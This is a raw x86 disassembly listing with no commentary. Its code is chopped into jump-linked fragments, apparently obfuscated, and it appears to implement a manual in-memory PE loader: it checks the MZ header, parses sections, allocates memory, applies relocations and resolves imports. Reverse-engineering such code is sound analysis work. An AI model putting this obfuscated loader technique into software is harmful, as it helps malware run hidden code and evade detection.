  401761:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401768:	00 
  401769:	e9 23 0e 00 00       	jmp    0x402591
  40176e:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  401771:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401775:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401778:	89 54 24 08          	mov    %edx,0x8(%esp)
  40177c:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40177f:	e9 38 0a 00 00       	jmp    0x4021bc
  401784:	75 0a                	jne    0x401790
  401786:	b8 00 00 00 00       	mov    $0x0,%eax
  40178b:	e9 7d 0a 00 00       	jmp    0x40220d
  401790:	e9 dc 0b 00 00       	jmp    0x402371
  401795:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40179c:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4017a3:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4017aa:	e9 a8 07 00 00       	jmp    0x401f57
  4017af:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4017b2:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4017b5:	8b 50 10             	mov    0x10(%eax),%edx
  4017b8:	e9 ed 01 00 00       	jmp    0x4019aa
  4017bd:	83 45 d8 01          	addl   $0x1,-0x28(%ebp)
  4017c1:	83 45 dc 28          	addl   $0x28,-0x24(%ebp)
  4017c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017c8:	8b 00                	mov    (%eax),%eax
  4017ca:	0f b7 40 06          	movzwl 0x6(%eax),%eax
  4017ce:	e9 1a 06 00 00       	jmp    0x401ded
  4017d3:	83 45 e0 14          	addl   $0x14,-0x20(%ebp)
  4017d7:	c7 44 24 04 14 00 00 	movl   $0x14,0x4(%esp)
  4017de:	00 
  4017df:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4017e2:	e9 d9 05 00 00       	jmp    0x401dc0
  4017e7:	89 e5                	mov    %esp,%ebp
  4017e9:	83 ec 30             	sub    $0x30,%esp
  4017ec:	8b 45 08             	mov    0x8(%ebp),%eax
  4017ef:	8b 40 04             	mov    0x4(%eax),%eax
  4017f2:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4017f5:	8b 45 08             	mov    0x8(%ebp),%eax
  4017f8:	e9 ae 0c 00 00       	jmp    0x4024ab
  4017fd:	8b 55 dc             	mov    -0x24(%ebp),%edx
  401800:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401803:	e9 1a 03 00 00       	jmp    0x401b22
  401808:	e8 fb 17 00 00       	call   0x403008
  40180d:	83 ec 04             	sub    $0x4,%esp
  401810:	83 45 ec 01          	addl   $0x1,-0x14(%ebp)
  401814:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401817:	eb 36                	jmp    0x40184f
  401819:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  401820:	00 
  401821:	89 54 24 04          	mov    %edx,0x4(%esp)
  401825:	89 04 24             	mov    %eax,(%esp)
  401828:	e8 d3 17 00 00       	call   0x403000
  40182d:	83 ec 10             	sub    $0x10,%esp
  401830:	e9 e2 00 00 00       	jmp    0x401917
  401835:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401838:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40183b:	89 50 08             	mov    %edx,0x8(%eax)
  40183e:	e9 85 06 00 00       	jmp    0x401ec8
  401843:	b8 00 00 00 00       	mov    $0x0,%eax
  401848:	84 c0                	test   %al,%al
  40184a:	e9 82 0c 00 00       	jmp    0x4024d1
  40184f:	8b 40 0c             	mov    0xc(%eax),%eax
  401852:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  401855:	0f 9f c0             	setg   %al
  401858:	84 c0                	test   %al,%al
  40185a:	0f 85 84 09 00 00    	jne    0x4021e4
  401860:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401863:	e9 ed fe ff ff       	jmp    0x401755
  401868:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40186b:	e9 42 09 00 00       	jmp    0x4021b2
  401870:	e9 20 ff ff ff       	jmp    0x401795
  401875:	89 c2                	mov    %eax,%edx
  401877:	03 55 0c             	add    0xc(%ebp),%edx
  40187a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40187d:	89 10                	mov    %edx,(%eax)
  40187f:	e9 25 04 00 00       	jmp    0x401ca9
  401884:	e9 ff 01 00 00       	jmp    0x401a88
  401889:	e8 9c 0c 00 00       	call   0x40252a
  40188e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401891:	8b 00                	mov    (%eax),%eax
  401893:	8b 40 28             	mov    0x28(%eax),%eax
  401896:	e9 e8 05 00 00       	jmp    0x401e83
  40189b:	c3                   	ret
  40189c:	55                   	push   %ebp
  40189d:	89 e5                	mov    %esp,%ebp
  40189f:	83 ec 48             	sub    $0x48,%esp
  4018a2:	c6 45 d5 01          	movb   $0x1,-0x2b(%ebp)
  4018a6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4018a9:	c1 e8 10             	shr    $0x10,%eax
  4018ac:	85 c0                	test   %eax,%eax
  4018ae:	0f 85 ff 0a 00 00    	jne    0x4023b3
  4018b4:	e9 f6 0a 00 00       	jmp    0x4023af
  4018b9:	66 3d 4d 5a          	cmp    $0x5a4d,%ax
  4018bd:	74 0a                	je     0x4018c9
  4018bf:	b8 00 00 00 00       	mov    $0x0,%eax
  4018c4:	e9 40 0a 00 00       	jmp    0x402309
  4018c9:	8b 55 08             	mov    0x8(%ebp),%edx
  4018cc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018cf:	e9 dc 06 00 00       	jmp    0x401fb0
  4018d4:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4018d7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4018da:	8d 04 02             	lea    (%edx,%eax,1),%eax
  4018dd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4018e0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4018e3:	8b 00                	mov    (%eax),%eax
  4018e5:	eb 8e                	jmp    0x401875
  4018e7:	53                   	push   %ebx
  4018e8:	83 ec 44             	sub    $0x44,%esp
  4018eb:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4018f2:	8b 45 08             	mov    0x8(%ebp),%eax
  4018f5:	8b 40 04             	mov    0x4(%eax),%eax
  4018f8:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4018fb:	e9 36 01 00 00       	jmp    0x401a36
  401900:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401903:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401906:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40190d:	e9 92 03 00 00       	jmp    0x401ca4
  401912:	e9 00 09 00 00       	jmp    0x402217
  401917:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40191a:	e9 16 ff ff ff       	jmp    0x401835
  40191f:	89 c2                	mov    %eax,%edx
  401921:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401924:	8b 40 54             	mov    0x54(%eax),%eax
  401927:	8d 04 02             	lea    (%edx,%eax,1),%eax
  40192a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40192e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401931:	e9 64 07 00 00       	jmp    0x40209a
  401936:	e9 d4 04 00 00       	jmp    0x401e0f
  40193b:	8b 45 08             	mov    0x8(%ebp),%eax
  40193e:	8b 50 08             	mov    0x8(%eax),%edx
  401941:	8b 45 08             	mov    0x8(%ebp),%eax
  401944:	8b 40 0c             	mov    0xc(%eax),%eax
  401947:	eb 4c                	jmp    0x401995
  401949:	8d 04 02             	lea    (%edx,%eax,1),%eax
  40194c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40194f:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401952:	e9 25 0b 00 00       	jmp    0x40247c
  401957:	89 50 34             	mov    %edx,0x34(%eax)
  40195a:	8b 45 08             	mov    0x8(%ebp),%eax
  40195d:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401960:	e9 33 05 00 00       	jmp    0x401e98
  401965:	8b 40 24             	mov    0x24(%eax),%eax
  401968:	25 00 00 00 40       	and    $0x40000000,%eax
  40196d:	85 c0                	test   %eax,%eax
  40196f:	e9 d7 08 00 00       	jmp    0x40224b
  401974:	8b 40 10             	mov    0x10(%eax),%eax
  401977:	85 c0                	test   %eax,%eax
  401979:	0f 85 68 05 00 00    	jne    0x401ee7
  40197f:	8b 45 0c             	mov    0xc(%ebp),%eax
  401982:	8b 40 38             	mov    0x38(%eax),%eax
  401985:	e9 10 02 00 00       	jmp    0x401b9a
  40198a:	0f b7 00             	movzwl (%eax),%eax
  40198d:	0f b7 c0             	movzwl %ax,%eax
  401990:	e9 00 04 00 00       	jmp    0x401d95
  401995:	89 c1                	mov    %eax,%ecx
  401997:	c1 e1 02             	shl    $0x2,%ecx
  40199a:	8d 0c 0a             	lea    (%edx,%ecx,1),%ecx
  40199d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4019a0:	89 11                	mov    %edx,(%ecx)
  4019a2:	8d 50 01             	lea    0x1(%eax),%edx
  4019a5:	e9 66 0b 00 00       	jmp    0x402510
  4019aa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4019ad:	8b 40 14             	mov    0x14(%eax),%eax
  4019b0:	03 45 08             	add    0x8(%ebp),%eax
  4019b3:	89 54 24 08          	mov    %edx,0x8(%esp)
  4019b7:	89 44 24 04          	mov    %eax,0x4(%esp)
  4019bb:	e9 c6 02 00 00       	jmp    0x401c86
  4019c0:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  4019c7:	00 
  4019c8:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  4019cf:	00 
  4019d0:	eb 3b                	jmp    0x401a0d
  4019d2:	8b 45 10             	mov    0x10(%ebp),%eax
  4019d5:	8b 00                	mov    (%eax),%eax
  4019d7:	0f b7 40 06          	movzwl 0x6(%eax),%eax
  4019db:	0f b7 c0             	movzwl %ax,%eax
  4019de:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  4019e1:	0f 9f c0             	setg   %al
  4019e4:	e9 37 0b 00 00       	jmp    0x402520
  4019e9:	8b 45 08             	mov    0x8(%ebp),%eax
  4019ec:	8b 58 08             	mov    0x8(%eax),%ebx
  4019ef:	e8 24 16 00 00       	call   0x403018
  4019f4:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4019f8:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4019ff:	00 
  401a00:	89 04 24             	mov    %eax,(%esp)
  401a03:	e8 18 16 00 00       	call   0x403020
  401a08:	e9 a9 02 00 00       	jmp    0x401cb6
  401a0d:	89 54 24 04          	mov    %edx,0x4(%esp)
  401a11:	89 04 24             	mov    %eax,(%esp)
  401a14:	e8 e7 15 00 00       	call   0x403000
  401a19:	83 ec 10             	sub    $0x10,%esp
  401a1c:	e9 8e fd ff ff       	jmp    0x4017af
  401a21:	85 c0                	test   %eax,%eax
  401a23:	0f 84 2d 02 00 00    	je     0x401c56
  401a29:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401a2c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a2f:	8b 00                	mov    (%eax),%eax
  401a31:	e9 fd 00 00 00       	jmp    0x401b33
  401a36:	8b 45 08             	mov    0x8(%ebp),%eax
  401a39:	8b 00                	mov    (%eax),%eax
  401a3b:	83 e8 80             	sub    $0xffffff80,%eax
  401a3e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401a41:	e9 e8 06 00 00       	jmp    0x40212e
  401a46:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  401a4d:	e9 73 fd ff ff       	jmp    0x4017c5
  401a52:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a55:	8b 40 24             	mov    0x24(%eax),%eax
  401a58:	25 00 00 00 20       	and    $0x20000000,%eax
  401a5d:	e9 65 02 00 00       	jmp    0x401cc7
  401a62:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401a65:	8b 40 24             	mov    0x24(%eax),%eax
  401a68:	e9 93 fe ff ff       	jmp    0x401900
  401a6d:	e8 7e 15 00 00       	call   0x402ff0
  401a72:	83 ec 08             	sub    $0x8,%esp
  401a75:	85 c0                	test   %eax,%eax
  401a77:	0f 85 c6 fd ff ff    	jne    0x401843
  401a7d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401a80:	8b 40 0c             	mov    0xc(%eax),%eax
  401a83:	e9 36 05 00 00       	jmp    0x401fbe
  401a88:	90                   	nop
  401a89:	e9 1b 02 00 00       	jmp    0x401ca9
  401a8e:	8b 00                	mov    (%eax),%eax
  401a90:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401a93:	e9 bf fe ff ff       	jmp    0x401957
  401a98:	8b 00                	mov    (%eax),%eax
  401a9a:	0f b7 40 14          	movzwl 0x14(%eax),%eax
  401a9e:	0f b7 c0             	movzwl %ax,%eax
  401aa1:	e9 46 04 00 00       	jmp    0x401eec
  401aa6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401aa9:	8b 40 08             	mov    0x8(%eax),%eax
  401aac:	c7 44 24 08 00 40 00 	movl   $0x4000,0x8(%esp)
  401ab3:	00 
  401ab4:	89 54 24 04          	mov    %edx,0x4(%esp)
  401ab8:	89 04 24             	mov    %eax,(%esp)
  401abb:	e9 44 06 00 00       	jmp    0x402104
  401ac0:	8b 45 08             	mov    0x8(%ebp),%eax
  401ac3:	8b 40 08             	mov    0x8(%eax),%eax
  401ac6:	85 c0                	test   %eax,%eax
  401ac8:	0f 85 6d fe ff ff    	jne    0x40193b
  401ace:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  401ad5:	e9 5c fe ff ff       	jmp    0x401936
  401ada:	8b 45 08             	mov    0x8(%ebp),%eax
  401add:	8b 00                	mov    (%eax),%eax
  401adf:	89 c2                	mov    %eax,%edx
  401ae1:	8b 45 08             	mov    0x8(%ebp),%eax
  401ae4:	eb b2                	jmp    0x401a98
  401ae6:	0f 95 c0             	setne  %al
  401ae9:	84 c0                	test   %al,%al
  401aeb:	0f 85 15 04 00 00    	jne    0x401f06
  401af1:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  401af5:	0f 84 13 03 00 00    	je     0x401e0e
  401afb:	e9 d3 fc ff ff       	jmp    0x4017d3
  401b00:	8b 40 24             	mov    0x24(%eax),%eax
  401b03:	25 80 00 00 00       	and    $0x80,%eax
  401b08:	e9 9b 08 00 00       	jmp    0x4023a8
  401b0d:	8b 40 24             	mov    0x24(%eax),%eax
  401b10:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401b13:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  401b17:	0f 84 a0 fc ff ff    	je     0x4017bd
  401b1d:	e9 b3 05 00 00       	jmp    0x4020d5
  401b22:	8b 40 20             	mov    0x20(%eax),%eax
  401b25:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401b28:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401b2b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  401b2e:	e9 2f ff ff ff       	jmp    0x401a62
  401b33:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401b36:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401b39:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401b3c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401b3f:	8b 40 10             	mov    0x10(%eax),%eax
  401b42:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401b45:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401b48:	e9 5c 0a 00 00       	jmp    0x4025a9
  401b4d:	e9 04 01 00 00       	jmp    0x401c56
  401b52:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401b55:	8b 50 10             	mov    0x10(%eax),%edx
  401b58:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401b5b:	8b 40 0c             	mov    0xc(%eax),%eax
  401b5e:	03 45 ec             	add    -0x14(%ebp),%eax
  401b61:	e9 5a fe ff ff       	jmp    0x4019c0
  401b66:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401b6d:	00 
  401b6e:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401b75:	00 
  401b76:	89 04 24             	mov    %eax,(%esp)
  401b79:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401b7c:	e9 ab 07 00 00       	jmp    0x40232c
  401b81:	0f 97 c0             	seta   %al
  401b84:	84 c0                	test   %al,%al
  401b86:	eb 27                	jmp    0x401baf
  401b88:	85 c0                	test   %eax,%eax
  401b8a:	e9 ac 09 00 00       	jmp    0x40253b
  401b8f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401b92:	8b 50 10             	mov    0x10(%eax),%edx
  401b95:	e9 0c ff ff ff       	jmp    0x401aa6
  401b9a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401b9d:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  401ba1:	0f 8e f8 00 00 00    	jle    0x401c9f
  401ba7:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401baa:	e9 74 05 00 00       	jmp    0x402123
  401baf:	0f 85 62 06 00 00    	jne    0x402217
  401bb5:	83 7d e0 ff          	cmpl   $0xffffffff,-0x20(%ebp)
  401bb9:	75 0a                	jne    0x401bc5
  401bbb:	b8 00 00 00 00       	mov    $0x0,%eax
  401bc0:	e9 48 06 00 00       	jmp    0x40220d
  401bc5:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401bc8:	e9 7e 08 00 00       	jmp    0x40244b
  401bcd:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401bd0:	c9                   	leave
  401bd1:	c3                   	ret
  401bd2:	55                   	push   %ebp
  401bd3:	e9 8e 04 00 00       	jmp    0x402066
  401bd8:	e9 36 ff ff ff       	jmp    0x401b13
  401bdd:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401be0:	e9 1b ff ff ff       	jmp    0x401b00
  401be5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401be8:	e9 1c 07 00 00       	jmp    0x402309
  401bed:	90                   	nop
  401bee:	e9 34 06 00 00       	jmp    0x402227
  401bf3:	e9 3d 09 00 00       	jmp    0x402535
  401bf8:	e9 5c 09 00 00       	jmp    0x402559
  401bfd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401c00:	e9 6f fd ff ff       	jmp    0x401974
  401c05:	f7 d8                	neg    %eax
  401c07:	e9 52 09 00 00       	jmp    0x40255e
  401c0c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c0f:	8b 40 04             	mov    0x4(%eax),%eax
  401c12:	83 e8 08             	sub    $0x8,%eax
  401c15:	d1 e8                	shr    $1,%eax
  401c17:	e9 0b fb ff ff       	jmp    0x401727
  401c1c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401c1f:	8b 40 24             	mov    0x24(%eax),%eax
  401c22:	25 00 00 00 04       	and    $0x4000000,%eax
  401c27:	85 c0                	test   %eax,%eax
  401c29:	74 07                	je     0x401c32
  401c2b:	81 4d e4 00 02 00 00 	orl    $0x200,-0x1c(%ebp)
  401c32:	e9 bd 00 00 00       	jmp    0x401cf4
  401c37:	e9 5b 07 00 00       	jmp    0x402397
  401c3c:	8b 55 dc             	mov    -0x24(%ebp),%edx
  401c3f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401c42:	8b 00                	mov    (%eax),%eax
  401c44:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401c47:	89 44 24 04          	mov    %eax,0x4(%esp)
  401c4b:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c4e:	89 04 24             	mov    %eax,(%esp)
  401c51:	e9 df 00 00 00       	jmp    0x401d35
  401c56:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401c59:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401c5c:	8b 40 10             	mov    0x10(%eax),%eax
  401c5f:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401c62:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401c65:	e9 aa 07 00 00       	jmp    0x402414
  401c6a:	c7 44 24 08 00 20 00 	movl   $0x2000,0x8(%esp)
  401c71:	00 
  401c72:	89 54 24 04          	mov    %edx,0x4(%esp)
  401c76:	89 04 24             	mov    %eax,(%esp)
  401c79:	e8 82 13 00 00       	call   0x403000
  401c7e:	83 ec 10             	sub    $0x10,%esp
  401c81:	e9 5f 07 00 00       	jmp    0x4023e5
  401c86:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401c89:	89 04 24             	mov    %eax,(%esp)
  401c8c:	e8 ef 12 00 00       	call   0x402f80
  401c91:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401c94:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401c97:	89 50 08             	mov    %edx,0x8(%eax)
  401c9a:	e9 b2 08 00 00       	jmp    0x402551
  401c9f:	e9 ac 08 00 00       	jmp    0x402550
  401ca4:	e9 9e fa ff ff       	jmp    0x401747
  401ca9:	83 45 dc 01          	addl   $0x1,-0x24(%ebp)
  401cad:	83 45 f0 02          	addl   $0x2,-0x10(%ebp)
  401cb1:	e9 56 ff ff ff       	jmp    0x401c0c
  401cb6:	83 ec 0c             	sub    $0xc,%esp
  401cb9:	8b 45 08             	mov    0x8(%ebp),%eax
  401cbc:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401cbf:	89 50 08             	mov    %edx,0x8(%eax)
  401cc2:	e9 f9 fd ff ff       	jmp    0x401ac0
  401cc7:	85 c0                	test   %eax,%eax
  401cc9:	0f 95 c0             	setne  %al
  401ccc:	0f b6 c0             	movzbl %al,%eax
  401ccf:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401cd2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401cd5:	e9 8b fc ff ff       	jmp    0x401965
  401cda:	0f 84 33 fe ff ff    	je     0x401b13
  401ce0:	8b 45 08             	mov    0x8(%ebp),%eax
  401ce3:	8b 00                	mov    (%eax),%eax
  401ce5:	e9 23 fe ff ff       	jmp    0x401b0d
  401cea:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ced:	8b 00                	mov    (%eax),%eax
  401cef:	e9 ed 07 00 00       	jmp    0x4024e1
  401cf4:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401cf7:	8b 40 10             	mov    0x10(%eax),%eax
  401cfa:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401cfd:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  401d01:	e9 e6 04 00 00       	jmp    0x4021ec
  401d06:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401d09:	8b 00                	mov    (%eax),%eax
  401d0b:	8d 04 02             	lea    (%edx,%eax,1),%eax
  401d0e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401d11:	e9 e4 04 00 00       	jmp    0x4021fa
  401d16:	85 c0                	test   %eax,%eax
  401d18:	0f 84 e3 07 00 00    	je     0x402501
  401d1e:	e9 17 02 00 00       	jmp    0x401f3a
  401d23:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401d26:	c1 e2 02             	shl    $0x2,%edx
  401d29:	01 d0                	add    %edx,%eax
  401d2b:	8b 00                	mov    (%eax),%eax
  401d2d:	89 04 24             	mov    %eax,(%esp)
  401d30:	e9 d3 fa ff ff       	jmp    0x401808
  401d35:	e8 56 12 00 00       	call   0x402f90
  401d3a:	85 c0                	test   %eax,%eax
  401d3c:	0f 85 f5 fe ff ff    	jne    0x401c37
  401d42:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d45:	0f b7 00             	movzwl (%eax),%eax
  401d48:	0f b7 c0             	movzwl %ax,%eax
  401d4b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401d4e:	e9 62 fe ff ff       	jmp    0x401bb5
  401d53:	e9 fe 03 00 00       	jmp    0x402156
  401d58:	8b 00                	mov    (%eax),%eax
  401d5a:	25 ff ff 00 00       	and    $0xffff,%eax
  401d5f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401d63:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d66:	89 04 24             	mov    %eax,(%esp)
  401d69:	e8 6a 12 00 00       	call   0x402fd8
  401d6e:	83 ec 08             	sub    $0x8,%esp
  401d71:	8b 55 e8             	mov    -0x18(%ebp),%edx
  401d74:	e9 91 02 00 00       	jmp    0x40200a
  401d79:	83 ec 04             	sub    $0x4,%esp
  401d7c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401d7f:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401d83:	0f 85 ea 03 00 00    	jne    0x402173
  401d89:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  401d90:	e9 d9 03 00 00       	jmp    0x40216e
  401d95:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401d98:	e9 18 fe ff ff       	jmp    0x401bb5
  401d9d:	e9 95 fe ff ff       	jmp    0x401c37
  401da2:	8b 40 24             	mov    0x24(%eax),%eax
  401da5:	83 e0 40             	and    $0x40,%eax
  401da8:	85 c0                	test   %eax,%eax
  401daa:	0f 84 2d fe ff ff    	je     0x401bdd
  401db0:	8b 45 08             	mov    0x8(%ebp),%eax
  401db3:	8b 00                	mov    (%eax),%eax
  401db5:	8b 40 20             	mov    0x20(%eax),%eax
  401db8:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401dbb:	e9 18 fe ff ff       	jmp    0x401bd8
  401dc0:	89 04 24             	mov    %eax,(%esp)
  401dc3:	e9 a5 fc ff ff       	jmp    0x401a6d
  401dc8:	e9 f0 f9 ff ff       	jmp    0x4017bd
  401dcd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401dd0:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401dd3:	e9 6d 01 00 00       	jmp    0x401f45
  401dd8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401ddb:	8b 40 3c             	mov    0x3c(%eax),%eax
  401dde:	01 c2                	add    %eax,%edx
  401de0:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401de3:	89 10                	mov    %edx,(%eax)
  401de5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401de8:	e9 a1 fc ff ff       	jmp    0x401a8e
  401ded:	0f b7 c0             	movzwl %ax,%eax
  401df0:	3b 45 d8             	cmp    -0x28(%ebp),%eax
  401df3:	0f 9f c0             	setg   %al
  401df6:	84 c0                	test   %al,%al
  401df8:	0f 85 54 fc ff ff    	jne    0x401a52
  401dfe:	c9                   	leave
  401dff:	c3                   	ret
  401e00:	55                   	push   %ebp
  401e01:	e9 e1 f9 ff ff       	jmp    0x4017e7
  401e06:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401e09:	e9 bc 04 00 00       	jmp    0x4022ca
  401e0e:	90                   	nop
  401e0f:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401e12:	e9 b6 fd ff ff       	jmp    0x401bcd
  401e17:	85 c0                	test   %eax,%eax
  401e19:	0f 84 27 07 00 00    	je     0x402546
  401e1f:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401e22:	e9 13 f9 ff ff       	jmp    0x40173a
  401e27:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401e2a:	8b 40 04             	mov    0x4(%eax),%eax
  401e2d:	c7 44 24 08 00 80 00 	movl   $0x8000,0x8(%esp)
  401e34:	00 
  401e35:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401e3c:	00 
  401e3d:	89 04 24             	mov    %eax,(%esp)
  401e40:	e8 cb 11 00 00       	call   0x403010
  401e45:	83 ec 0c             	sub    $0xc,%esp
  401e48:	e9 31 04 00 00       	jmp    0x40227e
  401e4d:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  401e54:	e9 98 fc ff ff       	jmp    0x401af1
  401e59:	e9 43 07 00 00       	jmp    0x4025a1
  401e5e:	e8 b5 11 00 00       	call   0x403018
  401e63:	c7 44 24 08 14 00 00 	movl   $0x14,0x8(%esp)
  401e6a:	00 
  401e6b:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401e72:	00 
  401e73:	89 04 24             	mov    %eax,(%esp)
  401e76:	e8 7d 11 00 00       	call   0x402ff8
  401e7b:	83 ec 0c             	sub    $0xc,%esp
  401e7e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401e81:	eb 83                	jmp    0x401e06
  401e83:	85 c0                	test   %eax,%eax
  401e85:	0f 84 5a fd ff ff    	je     0x401be5
  401e8b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  401e8e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401e91:	8b 00                	mov    (%eax),%eax
  401e93:	e9 79 02 00 00       	jmp    0x402111
  401e98:	89 54 24 08          	mov    %edx,0x8(%esp)
  401e9c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  401e9f:	89 54 24 04          	mov    %edx,0x4(%esp)
  401ea3:	89 04 24             	mov    %eax,(%esp)
  401ea6:	e8 84 01 00 00       	call   0x40202f
  401eab:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401eae:	8b 40 34             	mov    0x34(%eax),%eax
  401eb1:	e9 4f fd ff ff       	jmp    0x401c05
  401eb6:	25 00 00 00 02       	and    $0x2000000,%eax
  401ebb:	85 c0                	test   %eax,%eax
  401ebd:	0f 84 0a ff ff ff    	je     0x401dcd
  401ec3:	e9 c7 fc ff ff       	jmp    0x401b8f
  401ec8:	8b 45 e8             	mov    -0x18(%ebp),%eax
